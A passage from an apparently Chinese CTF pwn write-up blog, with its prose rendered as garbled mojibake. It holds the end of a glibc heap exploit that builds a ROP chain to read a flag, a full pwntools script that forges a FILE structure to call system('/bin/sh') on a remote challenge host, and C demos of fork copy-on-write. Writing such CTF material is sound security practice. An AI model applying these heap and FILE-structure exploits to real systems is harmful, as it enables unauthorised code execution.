class="string">&#x27;\a\n&#x27;</span>)</span><br><span class="line">    delete_note(<span class="number">11</span>)</span><br><span class="line">    delete_note(<span class="number">2</span>)</span><br><span class="line">    read_note(<span class="number">0</span>,<span class="number">12</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;content: &quot;</span>)</span><br><span class="line">    heap_base=u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x18a0</span></span><br><span class="line">    write_note(<span class="number">0x70</span>,<span class="string">&#x27;a\n&#x27;</span>)</span><br><span class="line">    write_note(<span class="number">0x70</span>,<span class="string">&#x27;a\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        delete_note(<span class="number">4</span>+i)</span><br><span class="line">    delete_note(<span class="number">2</span>)</span><br><span class="line">    delete_note(<span class="number">11</span>)</span><br><span class="line">    delete_note(<span class="number">12</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        write_note(<span class="number">0x70</span>,<span class="string">&#x27;a\n&#x27;</span>)</span><br><span class="line">    stderr=libc_base+<span class="number">0x1ed5c0</span></span><br><span class="line">    write_note(<span class="number">0x70</span>,p64(stderr-<span class="number">0x10</span>)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    write_note(<span class="number">0x70</span>,<span class="string">&#x27;a\n&#x27;</span>)</span><br><span class="line">    write_note(<span class="number">0x70</span>,<span class="string">&#x27;a\n&#x27;</span>)</span><br><span class="line">    setcontext_addr=libc_base+libc.sym[<span class="string">&quot;setcontext&quot;</span>]</span><br><span class="line">    pay=<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x10</span>+<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x28</span>+p64(stderr+<span class="number">0x10</span>)</span><br><span class="line">    pay=pay.ljust(<span class="number">0x70</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    write_note(<span class="number">0x70</span>,pay)</span><br><span class="line">    </span><br><span class="line">    io_str_jumps_addr=libc_base+<span class="number">0x1e9560</span></span><br><span class="line"></span><br><span class="line">    delete_note(<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">        delete_note(<span class="number">4</span>+i)</span><br><span class="line">    delete_note(<span class="number">10</span>)</span><br><span class="line">    delete_note(<span class="number">11</span>)</span><br><span class="line">    delete_note(<span class="number">12</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        write_note(<span class="number">0x70</span>,<span class="string">&#x27;a\n&#x27;</span>)</span><br><span class="line">    write_note(<span class="number">0x70</span>,p64(stderr+<span class="number">0xb0</span>)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    write_note(<span class="number">0x70</span>,<span class="string">&#x27;a\n&#x27;</span>)</span><br><span class="line">    write_note(<span class="number">0x70</span>,<span class="string">&#x27;a\n&#x27;</span>)</span><br><span class="line">    pay=p64(heap_base+<span class="number">0x1620</span>)+p64(ret)+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(io_str_jumps_addr)</span><br><span class="line">    write_note(<span class="number">0x70</span>,pay+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    delete_note(<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">        delete_note(<span class="number">4</span>+i)</span><br><span class="line">    delete_note(<span class="number">10</span>)</span><br><span class="line">    delete_note(<span class="number">11</span>)</span><br><span class="line">    delete_note(<span class="number">12</span>)</span><br><span class="line">    payload1=p64(pop_rax)+p64(<span class="number">2</span>)+p64(pop_rdi)+p64(heap_base+<span class="number">0x16a0</span>)</span><br><span class="line">    payload1+=p64(pop_rdx_r12)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(pop_rsi)+p64(<span class="number">0</span>)+p64(syscall_ret)</span><br><span class="line">    payload1+=p64(pop_rax)+p64(<span class="number">0</span>)+p64(add_rsp_0x20_pop_rdx)</span><br><span class="line"></span><br><span class="line">    payload2=<span class="string">&quot;./flag\x00\x00&quot;</span>+p64(<span class="number">0</span>)+p64(pop_rdi)+p64(<span class="number">3</span>)+p64(pop_rsi)+p64(heap_base+<span class="number">0x2000</span>)+p64(pop_rdx_r12)</span><br><span class="line">    payload2+=p64(<span class="number">0x30</span>)*<span class="number">2</span>+p64(syscall_ret)+p64(pop_rdi)+p64(heap_base+<span class="number">0x2000</span>)+p64(libc_base+libc.sym[<span class="string">&quot;puts&quot;</span>])</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        write_note(<span class="number">0x70</span>,payload2+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">        write_note(<span class="number">0x70</span>,payload1+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    write_note(<span class="number">0x70</span>,p64(libc_base+libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>])+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    write_note(<span class="number">0x70</span>,<span class="string">&#x27;a\n&#x27;</span>)</span><br><span class="line">    write_note(<span class="number">0x70</span>,<span class="string">&#x27;a\n&#x27;</span>)</span><br><span class="line">    write_note(<span class="number">0x70</span>,p64(setcontext_addr+<span class="number">61</span>)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(sh)</span></span><br><span class="line">    delete_note(<span class="number">0</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;size: &quot;</span>,<span class="built_in">str</span>(<span class="number">0x100</span>))</span><br><span class="line">    <span class="built_in">print</span> sh.recv()</span><br><span class="line">    sh.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>

<h2 id="0x3-å¿˜äº†å«å•¥å"><a href="#0x3-å¿˜äº†å«å•¥å" class="headerlink" title="0x3 å¿˜äº†å«å•¥å"></a>0x3 å¿˜äº†å«å•¥å</h2><p>ä»»æ„æ–‡ä»¶è¯»åŠ æº¢å‡ºioæŒ‡é’ˆå®Œæˆgetshell</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">sh=remote(<span class="string">&quot;10.7.2.142&quot;</span>,<span class="number">9898</span>)</span><br><span class="line"><span class="comment">#sh=process([&#x27;/home/rootzhang/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so&#x27;, &#x27;./pwn&#x27;], env=&#123;&quot;LD_PRELOAD&quot;:&#x27;/home/rootzhang/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&#x27;&#125;)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/rootzhang/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&#x27;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">guess</span>():</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;Your guess:&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;Your guess:&quot;</span>,<span class="built_in">str</span>(<span class="number">6</span>))</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;Your guess:&quot;</span>,<span class="built_in">str</span>(<span class="number">7</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gitf</span>(<span class="params">filepath</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;FileName: &quot;</span>)</span><br><span class="line">    sh.sendline(filepath)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    guess()</span><br><span class="line">    gitf(<span class="string">&#x27;/proc/self/maps&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Open successful\n&quot;</span>)</span><br><span class="line">    elf_addr=<span class="built_in">int</span>((sh.recv(<span class="number">12</span>)),<span class="number">16</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;[heap]\n&quot;</span>)</span><br><span class="line">    libc_addr=<span class="built_in">int</span>((sh.recv(<span class="number">12</span>)),<span class="number">16</span>)</span><br><span class="line">    fake_file=elf_addr+<span class="number">0x4300</span>+<span class="number">0x10</span></span><br><span class="line">    pay=<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x4300</span>-<span class="number">0x42E0</span>)</span><br><span class="line">    pay+=p64(fake_file)+p64(<span class="number">0</span>)</span><br><span class="line">    pay+=<span class="string">&#x27;\xff\xff\xdf\xff;/bin/sh\x00&#x27;</span>.ljust(<span class="number">0xd8</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    pay+=p64(fake_file+<span class="number">0xe0</span>)</span><br><span class="line">    pay+=p64(libc_addr+libc.sym[<span class="string">&quot;system&quot;</span>])*<span class="number">21</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;We will give you a million bonus cheque.\nLeave your name:&quot;</span>)</span><br><span class="line">    sh.send(pay)</span><br><span class="line">    sh.interactive()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>

<h2 id="0x4-Mute-amp-Blind"><a href="#0x4-Mute-amp-Blind" class="headerlink" title="0x4 Mute&amp;Blind"></a>0x4 Mute&amp;Blind</h2><h4 id="0x4-1-çˆ¶å­è¿›ç¨‹çš„å…³ç³»"><a href="#0x4-1-çˆ¶å­è¿›ç¨‹çš„å…³ç³»" class="headerlink" title="0x4.1 çˆ¶å­è¿›ç¨‹çš„å…³ç³»"></a>0x4.1 çˆ¶å­è¿›ç¨‹çš„å…³ç³»</h4><p>æ¶‰åŠåˆ°äº†çˆ¶å­è¿›ç¨‹çš„é—®é¢˜ï¼Œä»¥å‰åªæ˜¯ç²—ç•¥çš„å­¦ä¹ äº†ä¸€ä¸‹ï¼ŒçŸ¥é“è¯¥æ€ä¹ˆä½¿ç”¨ï¼Œè¿™æ¬¡é€šè¿‡è¿™é“é¢˜å¯¹çˆ¶å­è¿›ç¨‹æœ‰äº†æ›´æ·±åˆ»çš„ç†è§£</p>
<p>æ¯ä¸ªè¿›ç¨‹éƒ½æœ‰è‡ªå·±çš„åœ°å€ç©ºé—´ï¼Œè¿™ä¸ªåœ°å€ç©ºé—´æ˜¯è™šæ‹Ÿçš„ï¼Œæ¯ä¸ªè¿›ç¨‹çš„è™šæ‹Ÿåœ°å€ç©ºé—´éƒ½æ˜¯ç‹¬ç«‹çš„ï¼Œæ¯ä¸ªè¿›ç¨‹çš„è™šæ‹Ÿåœ°å€ç©ºé—´å’Œè¿™ä¸ªè¿›ç¨‹çœŸæ­£åŠ è½½åˆ°å†…å­˜çš„ç‰©ç†åœ°å€å­˜åœ¨ç€æ˜ å°„å…³ç³»ï¼Œå½“è¿™ä¸ªè¿›ç¨‹æ‰§è¡ŒæŸä¸€æ¡æŒ‡ä»¤æ—¶å…ˆæŠŠè¿™ä¸ªæŒ‡ä»¤çš„è™šæ‹Ÿåœ°å€å‘é€åˆ°MMU(CPUçš„åœ°å€è½¬æ¢å•å…ƒ)ï¼Œè½¬åŒ–æˆè¿™ä¸ªæŒ‡ä»¤çš„çœŸå®ç‰©ç†åœ°å€ç„¶åæ‰¾åˆ°è¿™ä¸ªæŒ‡ä»¤å†è¿›è¡Œæ‰§è¡Œã€‚</p>
<p>å½“çˆ¶è¿›ç¨‹åˆ›å»ºå­è¿›ç¨‹çš„æ—¶å€™ï¼Œæ“ä½œç³»ç»Ÿå°±ä¼šæŠŠçˆ¶è¿›ç¨‹çš„è™šæ‹Ÿåœ°å€ç©ºé—´å¤åˆ¶ä¸€ä»½å†ç»™å­è¿›ç¨‹ï¼Œå¹¶ä¸”çˆ¶å­è¿›ç¨‹çš„ç›¸å¯¹äºç‰©ç†å†…å­˜çš„æ˜ å°„å…³ç³»æ˜¯ä¸€æ ·çš„ï¼Œæ³¨æ„æ˜¯æŠŠç‹¬ç«‹çš„ä¸€ä»½è™šæ‹Ÿåœ°å€ç©ºé—´ç»™äº†å­è¿›ç¨‹ï¼Œè€Œä¸æ˜¯çˆ¶å­è¿›ç¨‹å…±äº«åœ°å€ç©ºé—´ã€‚é€šè¿‡ä¸‹é¢çš„ä»£ç å¯ä»¥è¯æ˜ä»–ä»¬çš„è™šæ‹Ÿåœ°å€æ˜¯ä¸€æ ·ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">10</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">pid_t</span> pid=fork();</span><br><span class="line">	<span class="keyword">if</span>(pid==<span class="number">-1</span>)&#123;</span><br><span class="line">		perror(<span class="string">&quot;fork error&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span> <span class="keyword">if</span>(pid==<span class="number">0</span>)&#123;</span><br><span class="line">        sleep(<span class="number">2</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>,&amp;buf);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;chlid pid=%d\n&quot;</span>,getpid());</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;child is created\n&quot;</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>,&amp;buf);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;father pid=%d\n&quot;</span>,getpid());</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;father:my child is pid %d\n&quot;</span>,pid);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;susssess\n&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">10</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">pid_t</span> pid=fork();</span><br><span class="line">	<span class="keyword">if</span>(pid==<span class="number">-1</span>)&#123;</span><br><span class="line">		perror(<span class="string">&quot;fork error&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span> <span class="keyword">if</span>(pid==<span class="number">0</span>)&#123;</span><br><span class="line">        sleep(<span class="number">4</span>);</span><br><span class="line">        <span class="keyword">char</span> buff[<span class="number">20</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">        <span class="built_in">sprintf</span>(buff,<span class="string">&quot;/proc/%d/maps&quot;</span>,getpid());</span><br><span class="line">        <span class="keyword">int</span> fd=open(buff,<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">char</span> buf[<span class="number">1000</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">        read(fd,buf,<span class="number">900</span>);</span><br><span class="line">        write(<span class="number">1</span>,buf,<span class="number">900</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,buf);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;chlid pid=%d\n&quot;</span>,getpid());</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;child is created\n&quot;</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">int</span> fd=open(<span class="string">&quot;/proc/self/maps&quot;</span>,<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">char</span> buf[<span class="number">1000</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">        read(fd,buf,<span class="number">900</span>);</span><br><span class="line">        write(<span class="number">1</span>,buf,<span class="number">900</span>);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;father pid=%d\n&quot;</span>,getpid());</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;father:my child is pid %d\n&quot;</span>,pid);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;susssess\n&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>é‚£æ˜ å°„å…³ç³»ä¸€æ ·åˆæ˜¯ä»€ä¹ˆæ„æ€å‘¢ï¼Œå…¶å®å°±æ˜¯æŒ‡ä»–ä»¬æ˜ å°„åˆ°çš„ç‰©ç†å†…å­˜å†…å­˜æ˜¯ä¸€æ ·çš„ï¼Œæ¯”å¦‚çˆ¶è¿›ç¨‹çš„ä»£ç æ®µçš„ç‰©ç†åœ°å€æ˜¯1ï¼Œé‚£å­è¿›ç¨‹çš„ä»£ç æ®µçš„ç‰©ç†åœ°å€ä¹Ÿæ˜¯1ï¼Œå› ä¸ºåˆšå¼€å§‹çš„æ˜ å°„å…³ç³»æ˜¯ä¸€æ ·çš„ã€‚</p>
<p>çˆ¶å­è¿›ç¨‹çš„æ•°æ®éµå¾ªå†™æ—¶å¤åˆ¶ï¼Œè¯»æ—¶å…±äº«çš„åŸåˆ™ï¼Œä¹Ÿå°±æ˜¯è¯»çš„æ—¶å€™ä»–ä»¬çš„æ˜ å°„å…³ç³»è¿˜æ˜¯ä¸å˜çš„ï¼Œä½†å†™çš„æ—¶å€™å°±ä¼šå‘ç”Ÿæ”¹å˜ï¼Œå…·ä½“å˜åŒ–å¦‚ä¸‹</p>
<p>å†™ä¹‹å‰</p>
<p><img src="https://img-blog.csdn.net/20150724140942057" alt="img"></p>
<p>å†™å®Œå</p>
<p><img src="https://img-blog.csdn.net/20150724141000136" alt="img"></p>
<p>ä½†æ˜¯è¯»æ—¶å…±äº«ï¼Œå†™æ—¶å¤åˆ¶å¹¶ä¸é€‚ç”¨äºä»£ç æ®µï¼Œé¦–å…ˆå¯ä»¥ç¡®å®šçˆ¶å­è¿›ç¨‹çš„ä»£ç æ®µæ˜¯ç›¸åŒçš„ï¼Œæ‰€ä»¥ä»£ç æ®µæ˜¯æ²¡å¿…è¦å¤åˆ¶çš„ï¼Œå› æ­¤å†…æ ¸å°†ä»£ç æ®µæ ‡è®°ä¸ºåªè¯»ï¼Œè¿™æ ·çˆ¶å­è¿›ç¨‹å°±å¯ä»¥å®‰å…¨çš„å…±äº«æ­¤ä»£ç æ®µäº†ã€‚forkä¹‹ååœ¨è¿›ç¨‹åˆ›å»ºä»£ç æ®µæ—¶ï¼Œæ–°å­è¿›ç¨‹çš„è¿›ç¨‹çº§é¡µè¡¨é¡¹éƒ½æŒ‡å‘å’Œçˆ¶è¿›ç¨‹ç›¸åŒçš„ç‰©ç†é¡µå¸§ï¼Œæ‰€ä»¥å¦‚æœæ”¹å˜ä»£ç æ®µçš„å†…å®¹ä¼šç ´ååŸå…ˆçš„æ˜ å°„å…³ç³»ã€‚</p>
<p>è¿™æ˜¯æˆ‘å†™çš„ä¸€ä¸ªå°demoã€‚æˆ‘åœ¨çˆ¶è¿›ç¨‹ä¿®æ”¹äº†å­è¿›ç¨‹çš„ä»£ç æ®µï¼Œç„¶åè°ƒè¯•å­è¿›ç¨‹ï¼Œå‘ç°å­è¿›ç¨‹çš„ä»£ç å¹¶æ²¡æœ‰è¢«ä¿®æ”¹ï¼Œå¯è§çˆ¶å­è¿›ç¨‹çš„ä»£ç æ®µåº”è¯¥ä¹Ÿæ˜¯å†™æ—¶å¤åˆ¶ï¼Œè¯»æ—¶å…±äº«ï¼Œæ‰€ä»¥è¿™é“é¢˜å°±æ²¡åŠæ³•é€šè¿‡çˆ¶è¿›ç¨‹ä¿®æ”¹å­è¿›ç¨‹çš„ä»£ç æ®µæ¥æ§åˆ¶å­è¿›ç¨‹äº†</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> fd=open(<span class="string">&quot;/proc/self/maps&quot;</span>,<span class="number">0</span>);</span><br><span class="line">	<span class="keyword">char</span> buf[<span class="number">1000</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">	read(fd,buf,<span class="number">900</span>);</span><br><span class="line">	write(<span class="number">1</span>,buf,<span class="number">900</span>);</span><br><span class="line">	<span class="keyword">size_t</span> addr=<span class="number">0</span>;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%lld&quot;</span>,&amp;addr);</span><br><span class="line">	mprotect((<span class="keyword">void</span> *)addr,<span class="number">0x1000</span>,<span class="number">7</span>);</span><br><span class="line">	<span class="keyword">int</span> pid=fork();</span><br><span class="line">	<span class="keyword">if</span>(pid==<span class="number">-1</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,strerror(errno));</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span> <span class="keyword">if</span>(pid==<span class="number">0</span>)&#123;</span><br><span class="line">		sleep(<span class="number">10</span>);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;chlid\n&quot;</span>);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;father and child is not shared&quot;</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">size_t</span> child_text_addr=<span class="number">0</span>;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;input child_text_addr\n&quot;</span>);</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%lld&quot;</span>,&amp;child_text_addr);</span><br><span class="line">		<span class="built_in">sprintf</span>((<span class="keyword">void</span> *)child_text_addr,<span class="string">&quot;asdasdasdasdsad&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



